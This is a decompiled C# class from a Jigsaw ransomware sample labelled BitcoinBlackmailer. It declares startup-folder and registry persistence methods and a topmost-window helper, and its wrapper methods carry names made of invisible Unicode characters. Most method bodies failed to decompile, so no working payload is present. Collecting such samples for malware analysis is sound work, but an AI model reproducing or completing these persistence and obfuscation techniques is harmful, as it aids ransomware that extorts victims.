// Decompiled with JetBrains decompiler
// Type: Main.Tools.Windows
// Assembly: BitcoinBlackmailer, Version=37.0.2.5583, Culture=neutral, PublicKeyToken=null
// MVID: 1950B17F-8BE4-40AB-B698-96070A0C2297
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\Win.Ransomware.Jigsaw-6866216-0-9580e6c4deba3bd46419a402b6309f77c2ed47ad62299c82ec8578400c2a3a64.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Main.Tools
{
  internal static class Windows
  {
    private static readonly IntPtr HWND_TOPMOST;
    private const uint SWP_NOSIZE = 1;
    private const uint SWP_NOMOVE = 2;

    internal static void SetStartup(Main.Tools.Windows.StartupMethodType startupMethod)
    {
      // ISSUE: unable to decompile the method.
    }

    private static void SetStartupFolder()
    {
      // ISSUE: unable to decompile the method.
    }

    private static void SetStartupRegistry(string exePath)
    {
      // ISSUE: unable to decompile the method.
    }

    internal static void RemoveStartupRegistry(string exePath)
    {
      // ISSUE: unable to decompile the method.
    }

    [DllImport("user32.dll")]
    private static extern bool SetWindowPos(
      IntPtr hWnd,
      IntPtr hWndInsertAfter,
      int X,
      int Y,
      int cx,
      int cy,
      uint uFlags);

    internal static void MakeTopMost(Form f)
    {
      // ISSUE: unable to decompile the method.
    }

    static Windows()
    {
      // ISSUE: unable to decompile the method.
    }

    static string \u202C‪⁫‭‌⁬⁮‌‫‌​‎‭⁬⁮⁫⁬‬​⁫⁯‏⁬⁭‬⁯⁬‪‏‮‮​⁭⁭⁫‮‏​‪‎‮([In] Environment.SpecialFolder obj0) => Environment.GetFolderPath(obj0);

    static string \u200B⁯⁭⁫‎⁮‎‬​‭‮⁪‬⁯⁭⁫‏‌⁫‪‭​⁭‭⁮‍​‏‌‮⁭‌‍⁪‍‬⁪‎‏‏‮([In] string obj0) => Path.GetFileName(obj0);

    static string \u206D‬⁭‎‫‪⁬⁮⁬‪‬‌‬‮‫‪‌‭‌‌‏⁬⁭⁭‭⁮‭‬⁮‎⁬⁭‭‍‮‬‭‬⁪‪‮([In] string obj0, [In] string obj1) => Path.Combine(obj0, obj1);

    static RegistryKey \u200B⁭⁮⁬‮‎⁮‏​⁫‮‍‮⁭⁪‌⁮⁫‍⁮⁪‮​⁪⁬‫⁫‮⁫‫⁬‌‌‭‎‎‌‏⁫⁪‮(
      [In] RegistryKey obj0,
      [In] string obj1,
      [In] bool obj2)
    {
      return obj0.OpenSubKey(obj1, obj2);
    }

    static void \u202D‌‫‮‮‏‏⁪‬⁪‍‪⁯‫⁪‬⁮‮‮‫‪‏‌‮⁬‮‭‎‌‭⁬⁫⁭‎‬​⁫⁮​⁯‮(
      [In] RegistryKey obj0,
      [In] string obj1,
      [In] object obj2)
    {
      obj0.SetValue(obj1, obj2);
    }

    static void \u202D‬‫‮⁭‭⁫‌‌⁮⁪​‪⁪‭‎‏‍‌⁫‬‏‭‮‬⁮‎⁫‬⁭​⁭⁭‪‏‫⁯⁬‏‭‮(
      [In] RegistryKey obj0,
      [In] string obj1,
      [In] bool obj2)
    {
      obj0.DeleteValue(obj1, obj2);
    }

    static IntPtr \u200D‍‬‫‌‬⁪⁫⁫‎‪‮‍​⁫⁪⁪⁫‪‪‬⁫​⁫​‫⁯⁬‭‏⁪‌‪‮​⁭‌‍⁫⁬‮([In] Control obj0) => obj0.Handle;

    internal enum StartupMethodType
    {
      StartupFolder,
      Registry,
    }
  }
}
